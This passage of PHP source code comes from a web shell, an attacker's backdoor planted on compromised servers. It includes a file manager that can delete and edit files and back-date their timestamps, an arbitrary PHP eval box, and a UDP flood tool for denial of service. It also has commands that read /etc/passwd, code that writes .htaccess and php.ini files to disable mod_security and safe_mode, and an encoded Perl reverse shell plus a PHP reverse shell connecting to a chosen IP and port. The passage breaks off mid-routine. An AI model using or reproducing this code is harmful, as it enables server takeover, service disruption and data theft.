                    return sprintf('%1.2f', $s / 1048576 ) . ' MB';
            elseif($s &gt;= 1024)
                    return sprintf('%1.2f', $s / 1024 ) . ' KB';
            else
                    return $s . ' B';
    }


    function madPerms($p) {
            if (($p & 0xC000) == 0xC000)$i = 's';
            elseif (($p & 0xA000) == 0xA000)$i = 'l';
            elseif (($p & 0x8000) == 0x8000)$i = '-';
            elseif (($p & 0x6000) == 0x6000)$i = 'b';
            elseif (($p & 0x4000) == 0x4000)$i = 'd';
            elseif (($p & 0x2000) == 0x2000)$i = 'c';
            elseif (($p & 0x1000) == 0x1000)$i = 'p';
            else $i = 'u';
            $i .= (($p & 0x0100) ? 'r' : '-');
            $i .= (($p & 0x0080) ? 'w' : '-');
            $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
            $i .= (($p & 0x0020) ? 'r' : '-');
            $i .= (($p & 0x0010) ? 'w' : '-');
            $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
            $i .= (($p & 0x0004) ? 'r' : '-');
            $i .= (($p & 0x0002) ? 'w' : '-');
            $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
            return $i;
    }
    function madPermsColor($f) {
            if (!@is_readable($f))
                    return '&lt;font color=#FF0000&gt;' . madPerms(@fileperms($f)) . '&lt;/font&gt;';
            elseif (!@is_writable($f))
                    return '&lt;font color=white&gt;' . madPerms(@fileperms($f)) . '&lt;/font&gt;';
            else
                    return '&lt;font color=#25ff00&gt;' . madPerms(@fileperms($f)) . '&lt;/font&gt;';
    }

    if(!function_exists("scandir")) {
            function scandir($dir) {
                    $dh  = opendir($dir);
                    while (false !== ($filename = readdir($dh)))
                    $files[] = $filename;
                    return $files;
            }
    }


    function madFilesMan() {
            madhead();
        echo '&lt;div class=header&gt;&lt;script&gt;p1_=p2_=p3_="";&lt;/script&gt;';
            if(!empty($_POST['p1'])) {
                    switch($_POST['p1']) {
                            case 'uploadFile':
                                    if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
                                            echo "Can't upload file!";
                                    break;
                            case 'mkdir':
                                    if(!@mkdir($_POST['p2']))
                                            echo "Can't create new dir";
                                    break;
                            case 'delete':
                                    function deleteDir($path) {
                                            $path = (substr($path,-1)=='/') ? $path:$path.'/';
                                            $dh  = opendir($path);
                                            while ( ($item = readdir($dh) ) !== false) {
                                                    $item = $path.$item;
                                                    if ( (basename($item) == "..") || (basename($item) == ".") )
                                                            continue;
                                                    $type = filetype($item);
                                                    if ($type == "dir")
                                                            deleteDir($item);
                                                    else
                                                            @unlink($item);
                                            }
                                            closedir($dh);
                                            @rmdir($path);
                                    }
                                    if(is_dir(@$_POST['p2']))
                                    deleteDir(@$_POST['p2']);
                                    else
                                    @unlink(@$_POST['p2']);
                                    break;
                    default:
                    if(!empty($_POST['p1'])) {
                                            $_SESSION['act'] = @$_POST['p1'];
                                            $_SESSION['f'] = @$_POST['f'];
                                            foreach($_SESSION['f'] as $k =&gt; $f)
                                                    $_SESSION['f'][$k] = urldecode($f);
                                            $_SESSION['c'] = @$_POST['c'];
                                    }
                                    break;
                    }
            }
            $dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
            if($dirContent === false) {     echo '&lt;h3&gt;&lt;span&gt;|  Access Denied! |&lt;/span&gt;&lt;/h3&gt;&lt;/div&gt;';madFooter(); return; }
            global $sort;
            $sort = array('name', 1);
            if(!empty($_POST['p1'])) {
                    if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
                            $sort = array($match[1], (int)$match[2]);
            }
    echo "
    &lt;table width='100%' class='main' cellspacing='0' cellpadding='2'  &gt;
    &lt;form name=files method=post&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Size&lt;/th&gt;&lt;th&gt;Modify&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;Permissions&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;";
            $dirs = $files = array();
            $n = count($dirContent);
            for($i=0;$i&lt;$n;$i++) {
                    $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
                    $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
                    $tmp = array('name' =&gt; $dirContent[$i],
                                             'path' =&gt; $GLOBALS['cwd'].$dirContent[$i],
                                             'modify' =&gt; @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
                                             'perms' =&gt; madPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
                                             'size' =&gt; @filesize($GLOBALS['cwd'].$dirContent[$i]),
                                             'owner' =&gt; $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
                                             'group' =&gt; $gr['name']?$gr['name']:@filegroup($dirContent[$i])
                                            );
                    if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
                            $files[] = array_merge($tmp, array('type' =&gt; 'file'));
                    elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
                            $dirs[] = array_merge($tmp, array('type' =&gt; 'link', 'link' =&gt; readlink($tmp['path'])));
                    elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&& ($dirContent[$i] != "."))
                            $dirs[] = array_merge($tmp, array('type' =&gt; 'dir'));
            }
            $GLOBALS['sort'] = $sort;
            function wsoCmp($a, $b) {
                    if($GLOBALS['sort'][0] != 'size')
                            return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
                    else
                            return (($a['size'] &lt; $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
            }
            usort($files, "wsoCmp");
            usort($dirs, "wsoCmp");
            $files = array_merge($dirs, $files);
            $l = 0;
            foreach($files as $f) {
                    echo '&lt;tr'.($l?' class=l1':'').'&gt;&lt;td&gt;&lt;a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')"&gt;'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" title=' . $f['link'] . '&gt;&lt;b&gt;| ' . htmlspecialchars($f['name']) . ' |&lt;/b&gt;').'&lt;/a&gt;&lt;/td&gt;&lt;td&gt;'.(($f['type']=='file')?madSize($f['size']):$f['type']).'&lt;/td&gt;&lt;td&gt;'.$f['modify'].'&lt;/td&gt;&lt;td&gt;'.$f['owner'].'/'.$f['group'].'&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')"&gt;'.$f['perms']
                            .'&lt;/td&gt;&lt;td&gt;&lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')"&gt;R&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')"&gt;T&lt;/a&gt;'.(($f['type']=='file')?' &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')"&gt;E&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')"&gt;D&lt;/a&gt;':'').'&lt;a href="#" onclick="g(\'FilesMan\',null,\'delete\', \''.urlencode($f['name']).'\')"&gt; X &lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;';
                    $l = $l?0:1;
            }
            echo "&lt;tr&gt;&lt;td colspan=7&gt;
            &lt;input type=hidden name=a value='FilesMan'&gt;
            &lt;input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'&gt;
            &lt;input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'&gt;
            &lt;/form&gt;&lt;/table&gt;&lt;/div&gt;";


        madfooter();
     }

      function madFilesTools() {
            if( isset($_POST['p1']) )
                    $_POST['p1'] = urldecode($_POST['p1']);
            if(@$_POST['p2']=='download') {
                    if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
                            ob_start("ob_gzhandler", 4096);
                            header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
                            if (function_exists("mime_content_type")) {
                                    $type = @mime_content_type($_POST['p1']);
                                    header("Content-Type: " . $type);
                            } else
                    header("Content-Type: application/octet-stream");
                            $fp = @fopen($_POST['p1'], "r");
                            if($fp) {
                                    while(!@feof($fp))
                                            echo @fread($fp, 1024);
                                    fclose($fp);
                            }
                    }exit;
            }
            if( @$_POST['p2'] == 'mkfile' ) {
                    if(!file_exists($_POST['p1'])) {
                            $fp = @fopen($_POST['p1'], 'w');
                            if($fp) {
                                    $_POST['p2'] = "edit";
                                    fclose($fp);
                            }
                    }
            }

       madhead();
            echo '&lt;div class=header&gt;';
            if( !file_exists(@$_POST['p1']) ) {
                    echo "&lt;pre class=ml1 style='margin-top:5px'&gt;FILE DOEST NOT EXITS &lt;/pre&gt;&lt;/div&gt;";
                    madFooter();
                    return;
            }
            $uid = @posix_getpwuid(@fileowner($_POST['p1']));
            if(!$uid) {
                    $uid['name'] = @fileowner($_POST['p1']);
                    $gid['name'] = @filegroup($_POST['p1']);
            } else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
            echo '&lt;span&gt;Name:&lt;/span&gt; '.htmlspecialchars(@basename($_POST['p1'])).' &lt;span&gt;Size:&lt;/span&gt; '.(is_file($_POST['p1'])?madSize(filesize($_POST['p1'])):'-').' &lt;span&gt;Permission:&lt;/span&gt; '.madPermsColor($_POST['p1']).' &lt;span&gt;Owner/Group:&lt;/span&gt; '.$uid['name'].'/'.$gid['name'].'&lt;br&gt;';
            echo '&lt;br&gt;';
            if( empty($_POST['p2']) )
                    $_POST['p2'] = 'view';
            if( is_file($_POST['p1']) )
                    $m = array('View', 'Highlight', 'Download', 'Edit', 'Chmod', 'Rename', 'Touch');
            else
                    $m = array('Chmod', 'Rename', 'Touch');
            foreach($m as $v)
                    echo '&lt;a  href=# onclick="g(null,null,null,\''.strtolower($v).'\')"&gt;&lt;span&gt;'.((strtolower($v)==@$_POST['p2'])?'&lt;b&gt;&lt;span&gt; '.$v.' &lt;/span&gt; &lt;/b&gt;':$v).' &lt;/span&gt;&lt;/a&gt; ';
            echo '&lt;br&gt;&lt;br&gt;';
            switch($_POST['p2']) {
                    case 'view':
                            echo '&lt;pre class=ml1&gt;';
                            $fp = @fopen($_POST['p1'], 'r');
                            if($fp) {
                                    while( !@feof($fp) )
                                            echo htmlspecialchars(@fread($fp, 1024));
                                    @fclose($fp);
                            }
                            echo '&lt;/pre&gt;';
                            break;
                    case 'highlight':
                            if( @is_readable($_POST['p1']) ) {
                                    echo '&lt;div class=ml1 style="background-color: #e1e1e1;color:black;"&gt;';
                                    $code = @highlight_file($_POST['p1'],true);
                                    echo str_replace(array('&lt;span ','&lt;/span&gt;'), array('&lt;font ','&lt;/font&gt;'),$code).'&lt;/div&gt;';
                            }
                            break;
                    case 'chmod':
                            if( !empty($_POST['p3']) ) {
                                    $perms = 0;
                                    for($i=strlen($_POST['p3'])-1;$i&gt;=0;--$i)
                                            $perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
                                    if(!@chmod($_POST['p1'], $perms))
                                            echo 'Can\'t set permissions!&lt;br&gt;&lt;script&gt;document.mf.p3.value="";&lt;/script&gt;';
                            }
                            clearstatcache();
                            echo '&lt;script&gt;p3_="";&lt;/script&gt;&lt;form onsubmit="g(null,null,null,null,this.chmod.value);return false;"&gt;&lt;input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
                            break;
                    case 'edit':
                            if( !is_writable($_POST['p1'])) {
                                    echo 'File isn\'t writeable';
                                    break;
                            }
                            if( !empty($_POST['p3']) ) {
                                    $time = @filemtime($_POST['p1']);
                                    $_POST['p3'] = substr($_POST['p3'],1);
                                    $fp = @fopen($_POST['p1'],"w");
                                    if($fp) {
                                            @fwrite($fp,$_POST['p3']);
                                            @fclose($fp);
                                            echo 'Saved!&lt;br&gt;&lt;script&gt;p3_="";&lt;/script&gt;';
                                            @touch($_POST['p1'],$time,$time);
                                    }
                            }
                            echo '&lt;form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"&gt;&lt;textarea name=text class=bigarea&gt;';
                            $fp = @fopen($_POST['p1'], 'r');
                            if($fp) {
                                    while( !@feof($fp) )
                                            echo htmlspecialchars(@fread($fp, 1024));
                                    @fclose($fp);
                            }
                            echo '&lt;/textarea&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
                            break;
                    case 'hexdump':
                            $c = @file_get_contents($_POST['p1']);
                            $n = 0;
                            $h = array('00000000&lt;br&gt;','','');
                            $len = strlen($c);
                            for ($i=0; $i&lt;$len; ++$i) {
                                    $h[1] .= sprintf('%02X',ord($c[$i])).' ';
                                    switch ( ord($c[$i]) ) {
                                            case 0:  $h[2] .= ' '; break;
                                            case 9:  $h[2] .= ' '; break;
                                            case 10: $h[2] .= ' '; break;
                                            case 13: $h[2] .= ' '; break;
                                            default: $h[2] .= $c[$i]; break;
                                    }
                                    $n++;
                                    if ($n == 32) {
                                            $n = 0;
                                            if ($i+1 &lt; $len) {$h[0] .= sprintf('%08X',$i+1).'&lt;br&gt;';}
                                            $h[1] .= '&lt;br&gt;';
                                            $h[2] .= "\n";
                                    }
                            }
                            echo '&lt;table cellspacing=1 cellpadding=5 bgcolor=black&gt;&lt;tr&gt;&lt;td bgcolor=gray&gt;&lt;span style="font-weight: normal;"&gt;&lt;pre&gt;'.$h[0].'&lt;/pre&gt;&lt;/span&gt;&lt;/td&gt;&lt;td bgcolor=#282828&gt;&lt;pre&gt;'.$h[1].'&lt;/pre&gt;&lt;/td&gt;&lt;td bgcolor=#333333&gt;&lt;pre&gt;'.htmlspecialchars($h[2]).'&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
                            break;
                    case 'rename':
                            if( !empty($_POST['p3']) ) {
                                    if(!@rename($_POST['p1'], $_POST['p3']))
                                            echo 'Can\'t rename!&lt;br&gt;';
                                    else
                                            die('&lt;script&gt;g(null,null,"'.urlencode($_POST['p3']).'",null,"")&lt;/script&gt;');
                            }
                            echo '&lt;form onsubmit="g(null,null,null,null,this.name.value);return false;"&gt;&lt;input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
                            break;
                    case 'touch':
                            if( !empty($_POST['p3']) ) {
                                    $time = strtotime($_POST['p3']);
                                    if($time) {
                                            if(!touch($_POST['p1'],$time,$time))
                                                    echo 'Fail!';
                                            else
                                                    echo 'Touched!';
                                    } else echo 'Bad time format!';
                            }
                            clearstatcache();
                            echo '&lt;script&gt;p3_="";&lt;/script&gt;&lt;form onsubmit="g(null,null,null,null,this.touch.value);return false;"&gt;&lt;input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
                            break;
            }
            echo '&lt;/div&gt;';
            madFooter();
    }  

    function madphpeval()
    {
        madhead();

        if(isset($_POST['p2']) && ($_POST['p2'] == 'ini')) {
                    echo '&lt;div class=header&gt;';
                    ob_start();
                    $INI=ini_get_all();
    print '&lt;table border=0&gt;&lt;tr&gt;'
            .'&lt;td class="listing"&gt;&lt;font class="highlight_txt"&gt;Param&lt;/td&gt;'
            .'&lt;td class="listing"&gt;&lt;font class="highlight_txt"&gt;Global value&lt;/td&gt;'
            .'&lt;td class="listing"&gt;&lt;font class="highlight_txt"&gt;Local Value&lt;/td&gt;'
            .'&lt;td class="listing"&gt;&lt;font class="highlight_txt"&gt;Access&lt;/td&gt;&lt;/tr&gt;';
    foreach ($INI as $param =&gt; $values)
            print "\n".'&lt;tr&gt;'
                    .'&lt;td class="listing"&gt;&lt;b&gt;'.$param.'&lt;/td&gt;'
                    .'&lt;td class="listing"&gt;'.$values['global_value'].' &lt;/td&gt;'
                    .'&lt;td class="listing"&gt;'.$values['local_value'].' &lt;/td&gt;'
                    .'&lt;td class="listing"&gt;'.$values['access'].' &lt;/td&gt;&lt;/tr&gt;';
                    $tmp = ob_get_clean();
            $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
                    $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
                    echo str_replace('&lt;h1','&lt;h2', $tmp) .'&lt;/div&gt;&lt;br&gt;';
            }

        if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
                    echo '&lt;div class=header&gt;&lt;style&gt;.p {color:#000;}&lt;/style&gt;';
                    ob_start();
                    phpinfo();
                    $tmp = ob_get_clean();
            $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
                    $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
                    echo str_replace('&lt;h1','&lt;h2', $tmp) .'&lt;/div&gt;&lt;br&gt;';
            }

        if(isset($_POST['p2']) && ($_POST['p2'] == 'exten')) {
                    echo '&lt;div class=header&gt;';
                    ob_start();
                 $EXT=get_loaded_extensions ();
         print '&lt;table border=0&gt;&lt;tr&gt;&lt;td class="listing"&gt;'
            .implode('&lt;/td&gt;&lt;/tr&gt;'."\n".'&lt;tr&gt;&lt;td class="listing"&gt;', $EXT)
            .'&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;'
            .count($EXT).' extensions loaded';


            echo '&lt;/div&gt;&lt;br&gt;';
            }


            if(empty($_POST['ajax']) && !empty($_POST['p1']))
                    $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
        echo '&lt;div class=header&gt;&lt;Center&gt;&lt;a href=# onclick="g(\'phpeval\',null,\'\',\'ini\')"&gt;| INI_INFO | &lt;/a&gt;&lt;a href=# onclick="g(\'phpeval\',null,\'\',\'info\')"&gt;    | phpinfo |&lt;/a&gt;&lt;a href=# onclick="g(\'phpeval\',null,\'\',\'exten\')"&gt;   | extensions  |&lt;/a&gt;&lt;/center&gt;&lt;br&gt;&lt;form name=pf method=post onsubmit="g(\'phpeval\',null,this.code.value,\'\'); return false;"&gt;&lt;textarea name=code class=bigarea id=PhpCode&gt;'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'&lt;/textarea&gt;&lt;center&gt;&lt;input type=submit value=Eval style="margin-top:5px"&gt;&lt;/center&gt;';
            echo '&lt;/form&gt;&lt;pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1&gt;';
            if(!empty($_POST['p1'])) {
                    ob_start();
                    eval($_POST['p1']);
                    echo htmlspecialchars(ob_get_clean());
            }
            echo '&lt;/pre&gt;&lt;/div&gt;';

        madfooter();
    }

    function madhash()
    {
        if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
        if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
            if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i&lt;strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
            if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i&lt;strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
            if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i&lt;strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
            $stringTools = array(
                    'Base64 encode' =&gt; 'base64_encode',
                    'Base64 decode' =&gt; 'base64_decode',
            'md5 hash' =&gt; 'md5',
                    'sha1 hash' =&gt; 'sha1',
                    'crypt' =&gt; 'crypt',
                    'CRC32' =&gt; 'crc32',
                    'Url encode' =&gt; 'urlencode',
                    'Url decode' =&gt; 'urldecode',
                    'Full urlencode' =&gt; 'full_urlencode',
                    'Htmlspecialchars' =&gt; 'htmlspecialchars',

            );

            madhead();
            echo '&lt;div class=header&gt;';
            if(empty($_POST['ajax'])&&!empty($_POST['p1']))
                    $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
            echo "&lt;form  onSubmit='g(null,null,this.selectTool.value,this.input.value); return false;'&gt;&lt;select name='selectTool'&gt;";
            foreach($stringTools as $k =&gt; $v)
                    echo "&lt;option value='".htmlspecialchars($v)."'&gt;".$k."&lt;/option&gt;";
                    echo "&lt;/select&gt;&lt;input type='submit' value='&gt;&gt;'/&gt;&lt;br&gt;&lt;textarea name='input' style='margin-top:5px' class=bigarea&gt;".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."&lt;/textarea&gt;&lt;/form&gt;&lt;pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'&gt;";
            if(!empty($_POST['p1'])) {
                    if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
            }
            echo "&lt;/div&gt;";
            madFooter();

    }
    function maddos()
    {
        madhead();
        echo '&lt;div class=header&gt;';
      if(empty($_POST['ajax'])&&!empty($_POST['p1']))
      $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
      echo '&lt;center&gt;&lt;span&gt;| UDP DOSSIER |&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;form onSubmit="g(null,null,this.udphost.value,this.udptime.value,this.udpport.value); return false;" method=POST&gt;&lt;span&gt;Host :&lt;/span&gt;&lt;input name="udphost" type="text"  size="25" /&gt;&lt;span&gt;Time :&lt;/span&gt;&lt;input name="udptime" type="text" size="15" /&gt;&lt;span&gt;Port :&lt;/span&gt;&lt;input name="udpport" type="text" size="10" /&gt;&lt;input  type="submit" value="&gt;&gt;" /&gt;&lt;/form&gt;&lt;/center&gt;';
      echo "&lt;pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' &gt;";
        if(!empty($_POST['p1']) && !empty($_POST['p2']) && !empty($_POST['p3']))
        {
             $packets=0;
            ignore_user_abort(true);
            $exec_time=$_POST['p2'];
            $time=time();
            $max_time=$exec_time+$time;
            $host=$_POST['p1'];
            $portudp=$_POST['p3'];
            for($i=0;$i&lt;65000;$i++)
            {
                $out .= 'X';
            }
            while(1){

             $packets++;
                if(time() &gt; $max_time){
                        break;
                }

                $fp = fsockopen('udp://'.$host, $portudp, $errno, $errstr, 5);
                if($fp){
                        fwrite($fp, $out);
                        fclose($fp);
                }
                }
             echo "$packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second";
             echo "&lt;/pre&gt;";
        }

        echo '&lt;/div&gt;';

        madfooter();
    }

    function madproc()
    {
        madhead();
        echo "&lt;Div class=header&gt;&lt;center&gt;";
        if(empty($_POST['ajax'])&&!empty($_POST['p1']))
      $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
      if($GLOBALS['sys']=="win")
      {
        $process=array(
        "System Info" =&gt;"systeminfo",
        "Active Connections" =&gt; "netstat -an",
            "Running Services" =&gt; "net start",
            "User Accounts" =&gt; "net user",
            "Show Computers" =&gt; "net view",
        "ARP Table" =&gt; "arp -a",
        "IP Configuration" =&gt; "ipconfig /all"
        );
        }
      else
      {
        $process=array(
        "Process status" =&gt; "ps aux",
        "Syslog" =&gt;"cat  /etc/syslog.conf",
        "Resolv" =&gt; "cat  /etc/resolv.conf",
        "Hosts" =&gt;"cat /etc/hosts",
        "Passwd" =&gt;"cat /etc/passwd",
        "Cpuinfo"=&gt;"cat /proc/cpuinfo",
        "Version"=&gt;"cat /proc/version",
        "Sbin"=&gt;"ls -al /usr/sbin",
        "Interrupts"=&gt;"cat /proc/interrupts",
        "lsattr"=&gt;"lsattr -va",
        "Uptime"=&gt;"uptime",
        "Fstab" =&gt;"cat /etc/fstab",
        "HDD Space" =&gt; "df -h"
        );}

        foreach($process as $n =&gt; $link)
        {
            echo '&lt;a href="#" onclick="g(null,null,\''.$link.'\')"&gt; | '.$n.' | &lt;/a&gt;';
        }
        echo "&lt;/center&gt;";
         if(!empty($_POST['p1']))
         {
            echo "&lt;pre class='ml1' style='margin-top:5px' &gt;";
            echo madEx($_POST['p1']);
            echo '&lt;/pre&gt;';
         }
         echo "&lt;/div&gt;";
         madfooter();
         }

    function madsafe()
    {
        madhead();
        echo "&lt;div class=header&gt;&lt;center&gt;&lt;h3&gt;&lt;span&gt;| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |&lt;/span&gt;&lt;/h3&gt;Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl =&gt; *.sh  ] files create in following dir&lt;br&gt;| ".$GLOBALS['cwd']." |&lt;br&gt;";
        echo '&lt;a href=# onclick="g(null,null,\'php.ini\',null)"&gt;| PHP.INI | &lt;/a&gt;&lt;a href=# onclick="g(null,null,null,\'ini\')"&gt;| .htaccess(Mod) | &lt;/a&gt;&lt;a href=# onclick="g(null,null,null,null,\'sh\')"&gt;| .htaccess(perl) | &lt;/a&gt;&lt;/center&gt;';
        if(!empty($_POST['p2']) && isset($_POST['p2']))
        {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'&lt;IfModule mod_security.c&gt;
    Sec------Engine Off
    Sec------ScanPOST Off
    &lt;/IfModule&gt;');
        fclose($fil);
       }
       if(!empty($_POST['p1'])&& isset($_POST['p1']))
       {
        $fil=fopen($GLOBALS['cwd']."php.ini","w");
          fwrite($fil,'safe_mode=OFF
    disable_functions=NONE');
         fclose($fil);
        }
        if(!empty($_POST['p3']) && isset($_POST['p3']))
        {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
    AddType application/x-httpd-cgi .sh
    AddHandler cgi-script .pl
    AddHandler cgi-script .pl');
         fclose($fil);
        }
        echo "&lt;br&gt;&lt;/div&gt;";
        madfooter();

    }

    function madconnect()
    {
     madhead();
     $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
     echo "&lt;div class=header&gt;&lt;center&gt;&lt;h3&gt;&lt;span&gt;| PERL AND PHP(threads) BACK CONNECT |&lt;/span&gt;&lt;/h3&gt;";
     echo "&lt;form  onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\"&gt;&lt;span&gt;PERL BACK CONNECT&lt;/span&gt;&lt;br&gt;IP: &lt;input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'&gt; Port: &lt;input type='text' name='port' value='443'&gt; &lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;";
     echo "&lt;br&gt;&lt;form  onSubmit=\"g(null,null,'php',this.server.value,this.port.value);return false;\"&gt;&lt;span&gt;PHP BACK CONNECT&lt;/span&gt;&lt;br&gt;IP: &lt;input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'&gt; Port: &lt;input type='text' name='port' value='443'&gt; &lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/center&gt;";
     if(isset($_POST['p1'])) {
                    function cf($f,$t) {
                            $w = @fopen($f,"w") or @function_exists('file_put_contents');
                            if($w){
                                    @fwrite($w,@base64_decode($t));
                                    @fclose($w);
                            }
                    }
                    if($_POST['p1'] == 'bcp') {
                            cf("/tmp/bc.pl",$back_connect_p);
                            $out = madEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1&gt;/dev/null 2&gt;&1 &");
                            echo "&lt;pre class=ml1 style='margin-top:5px'&gt;Successfully opened reverse shell to ".$_POST['p2'].":".$_POST['p3']."&lt;br&gt;Connecting...&lt;/pre&gt;";
                @unlink("/tmp/bc.pl");
                    }
            if($_POST['p1']=='php')
     {

    @set_time_limit (0);
    $ip = $_POST['p2'];
    $port =$_POST['p3'];
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;
    echo "&lt;pre class=ml1 style='margin-top:5px'&gt;";

    if (function_exists('pcntl_fork')) {

            $pid = pcntl_fork();

            if ($pid == -1) {
                    echo "Cant fork!&lt;br&gt;";
                    exit(1);
            }

            if ($pid) {
                    exit(0);  
            }

            if (posix_setsid() == -1) {
                    echo "Error: Can't setsid()&lt;br&gt;";
                    exit(1);
            }

            $daemon = 1;
    } else {
            echo "WARNING: Failed to daemonise.  This is quite common and not fatal&lt;br&gt;";
    }

    chdir("/");
